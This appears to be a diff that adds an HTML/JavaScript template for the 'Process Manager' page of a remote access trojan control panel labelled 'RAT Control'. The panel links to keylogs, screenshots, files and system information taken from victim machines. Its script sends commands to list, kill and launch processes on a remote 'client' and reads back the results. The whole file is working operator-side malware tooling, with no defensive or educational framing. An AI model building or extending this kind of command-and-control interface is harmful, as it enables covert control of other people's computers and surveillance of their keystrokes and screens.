@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Process Manager - {{ client_id[:16] }}...</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='dashboard.css') }}">
+    <style>
+        .process-table {
+            width: 100%;
+            background: #1a1a2e;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        
+        .process-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .process-table th {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+            color: white;
+        }
+        
+        .process-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #2a2a3e;
+            color: #e0e0e0;
+        }
+        
+        .process-table tr:hover {
+            background: #252540;
+        }
+        
+        .process-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn-small {
+            padding: 5px 12px;
+            font-size: 0.85em;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn-danger {
+            background: #ff4757;
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #ff3838;
+            transform: scale(1.05);
+        }
+        
+        .btn-info {
+            background: #00d9ff;
+            color: #0f0f1e;
+        }
+        
+        .btn-info:hover {
+            background: #00c4e6;
+            transform: scale(1.05);
+        }
+        
+        .controls-panel {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .input-group {
+            flex: 1;
+            min-width: 250px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #a0a0b0;
+            font-size: 0.9em;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            background: #252540;
+            border: 1px solid #2a2a3e;
+            border-radius: 5px;
+            color: white;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #a0a0b0;
+        }
+        
+        .loading::before {
+            content: "⏳";
+            display: block;
+            font-size: 3em;
+            margin-bottom: 15px;
+            animation: spin 2s linear infinite;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo">
+            <h2>🎯 RAT Control</h2>
+        </div>
+        <nav class="nav-menu">
+            <a href="/admin/dashboard" class="nav-item">
+                <span class="icon">🏠</span>
+                <span>Dashboard</span>
+            </a>
+            <a href="/admin/processes/{{ client_id }}" class="nav-item active">
+                <span class="icon">⚙️</span>
+                <span>Processes</span>
+            </a>
+            <a href="/admin/files/{{ client_id }}" class="nav-item">
+                <span class="icon">📁</span>
+                <span>Files</span>
+            </a>
+            <a href="/admin/keylogs/{{ client_id }}" class="nav-item">
+                <span class="icon">⌨️</span>
+                <span>Keylogs</span>
+            </a>
+            <a href="/admin/screenshot/{{ client_id }}" class="nav-item">
+                <span class="icon">📸</span>
+                <span>Screenshot</span>
+            </a>
+            <a href="/admin/system/{{ client_id }}" class="nav-item">
+                <span class="icon">ℹ️</span>
+                <span>System Info</span>
+            </a>
+        </nav>
+    </div>
+
+    <div class="main-content">
+        <header>
+            <h1>⚙️ Process Manager</h1>
+            <div class="header-actions">
+                <button class="btn btn-primary" onclick="loadProcesses()">
+                    🔄 Refresh Processes
+                </button>
+                <button class="btn btn-primary" onclick="viewProcessTree()">
+                    🌳 Process Tree
+                </button>
+                <a href="/admin/dashboard" class="btn btn-primary">⬅️ Back</a>
+            </div>
+        </header>
+
+        <div class="client-info" style="background: #1a1a2e; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+            <strong>Client:</strong> {{ hostname }} ({{ username }}) - <span class="status-{{ 'online' if is_online else 'offline' }}">{{ '🟢 Online' if is_online else '🔴 Offline' }}</span>
+        </div>
+
+        <div class="controls-panel">
+            <div class="input-group">
+                <label for="processName">Start New Process:</label>
+                <input type="text" id="processName" placeholder="e.g., notepad.exe">
+            </div>
+            <div style="display: flex; align-items: flex-end;">
+                <button class="btn btn-primary" onclick="startProcess()">🚀 Start Process</button>
+            </div>
+        </div>
+
+        <div class="controls-panel">
+            <div class="input-group">
+                <label for="searchProcess">Search Process:</label>
+                <input type="text" id="searchProcess" placeholder="Search by name or PID..." onkeyup="filterProcesses()">
+            </div>
+        </div>
+
+        <div id="processContent">
+            <div class="loading">Loading processes...</div>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='main.js') }}"></script>
+    <script>
+        const clientId = '{{ client_id }}';
+        let allProcesses = [];
+
+        async function loadProcesses() {
+            try {
+                document.getElementById('processContent').innerHTML = '<div class="loading">Loading processes...</div>';
+                
+                // Send command to list processes
+                const cmdResponse = await fetch(`/admin/process/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'list_processes'})
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (!cmdData.success) {
+                    throw new Error('Failed to queue command');
+                }
+                
+                // Wait for result
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                const resultResponse = await fetch(`/admin/command_result/${cmdData.command_id}`);
+                const resultData = await resultResponse.json();
+                
+                if (resultData.success && resultData.result) {
+                    allProcesses = resultData.result;
+                    displayProcesses(allProcesses);
+                } else {
+                    document.getElementById('processContent').innerHTML = '<div class="loading">❌ Failed to load processes</div>';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Error loading processes: ' + error.message, 'error');
+            }
+        }
+
+        function displayProcesses(processes) {
+            if (!processes || processes.length === 0) {
+                document.getElementById('processContent').innerHTML = '<div class="loading">No processes found</div>';
+                return;
+            }
+
+            let html = `
+                <div class="process-table">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>PID</th>
+                                <th>Name</th>
+                                <th>CPU %</th>
+                                <th>Memory (MB)</th>
+                                <th>Status</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+            `;
+
+            processes.forEach(proc => {
+                html += `
+                    <tr data-searchable="${proc.name.toLowerCase()} ${proc.pid}">
+                        <td>${proc.pid}</td>
+                        <td><strong>${proc.name}</strong></td>
+                        <td>${proc.cpu_percent ? proc.cpu_percent.toFixed(2) : '0.00'}%</td>
+                        <td>${proc.memory_mb ? proc.memory_mb.toFixed(2) : '0.00'}</td>
+                        <td>${proc.status || 'running'}</td>
+                        <td class="process-actions">
+                            <button class="btn-small btn-info" onclick="showProcessDetails(${proc.pid})">Details</button>
+                            <button class="btn-small btn-danger" onclick="killProcess(${proc.pid}, '${proc.name}')">Kill</button>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            html += `
+                        </tbody>
+                    </table>
+                </div>
+            `;
+
+            document.getElementById('processContent').innerHTML = html;
+        }
+
+        async function killProcess(pid, name) {
+            if (!confirm(`Are you sure you want to kill process "${name}" (PID: ${pid})?`)) {
+                return;
+            }
+
+            try {
+                const cmdResponse = await fetch(`/admin/process/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'kill_process',
+                        data: {pid: pid}
+                    })
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (cmdData.success) {
+                    showNotification(`Command sent to kill process ${pid}`, 'success');
+                    setTimeout(() => loadProcesses(), 2000);
+                }
+            } catch (error) {
+                showNotification('Error killing process: ' + error.message, 'error');
+            }
+        }
+
+        async function startProcess() {
+            const processName = document.getElementById('processName').value.trim();
+            if (!processName) {
+                showNotification('Please enter a process name', 'error');
+                return;
+            }
+
+            try {
+                const cmdResponse = await fetch(`/admin/process/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'start_process',
+                        data: {process_path: processName}
+                    })
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (cmdData.success) {
+                    showNotification(`Command sent to start ${processName}`, 'success');
+                    document.getElementById('processName').value = '';
+                    setTimeout(() => loadProcesses(), 2000);
+                }
+            } catch (error) {
+                showNotification('Error starting process: ' + error.message, 'error');
+            }
+        }
+
+        async function showProcessDetails(pid) {
+            try {
+                const cmdResponse = await fetch(`/admin/process/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'process_details',
+                        data: {pid: pid}
+                    })
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (cmdData.success) {
+                    showNotification('Fetching process details...', 'info');
+                    
+                    setTimeout(async () => {
+                        const resultResponse = await fetch(`/admin/command_result/${cmdData.command_id}`);
+                        const resultData = await resultResponse.json();
+                        
+                        if (resultData.success && resultData.result) {
+                            alert(JSON.stringify(resultData.result, null, 2));
+                        }
+                    }, 2000);
+                }
+            } catch (error) {
+                showNotification('Error fetching details: ' + error.message, 'error');
+            }
+        }
+
+        function viewProcessTree() {
+            showNotification('Process tree view coming soon...', 'info');
+        }
+
+        function filterProcesses() {
+            const searchTerm = document.getElementById('searchProcess').value.toLowerCase();
+            const rows = document.querySelectorAll('tr[data-searchable]');
+            
+            rows.forEach(row => {
+                const searchableText = row.getAttribute('data-searchable');
+                if (searchableText.includes(searchTerm)) {
+                    row.style.display = '';
+                } else {
+                    row.style.display = 'none';
+                }
+            });
+        }
+
+        // Load processes on page load
+        window.addEventListener('load', () => {
+            loadProcesses();
+        });
+    </script>
+</body>
+</html>
